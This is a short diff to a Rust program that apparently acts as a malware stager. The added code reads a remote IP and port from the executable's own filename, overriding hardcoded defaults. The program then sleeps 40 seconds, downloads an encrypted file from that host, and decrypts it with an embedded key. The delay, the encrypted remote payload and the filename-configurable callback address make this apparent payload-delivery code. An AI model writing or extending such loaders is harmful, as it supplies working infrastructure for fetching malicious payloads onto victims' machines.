@@ -32,9 +32,28 @@ fn main() {
         }
     }
 
+    // Override IP/port from binary filename if format is strongside_<ip>_<port>[.exe]
+    let exe_path = std::env::current_exe().unwrap_or_default();
+    let exe_stem = exe_path.file_stem().and_then(|s| s.to_str()).unwrap_or("");
+    let (remote_ip, remote_port) = if let Some(rest) = exe_stem.strip_prefix("strongside_") {
+        if let Some(sep) = rest.rfind('_') {
+            let ip = &rest[..sep];
+            let port = &rest[sep + 1..];
+            if !ip.is_empty() && !port.is_empty() {
+                (ip.to_string(), port.to_string())
+            } else {
+                (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
+            }
+        } else {
+            (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
+        }
+    } else {
+        (REMOTE_IP.to_string(), REMOTE_PORT.to_string())
+    };
+
     wait(Duration::from_secs(40));
     let key = decode_hex::<32>(KEY_HEX);
-    let encrypted_data = download_file(REMOTE_IP, REMOTE_PORT, FILE_PATH).unwrap();
+    let encrypted_data = download_file(&remote_ip, &remote_port, FILE_PATH).unwrap();
     let data = decrypt_data(&key, encrypted_data);
 }
 
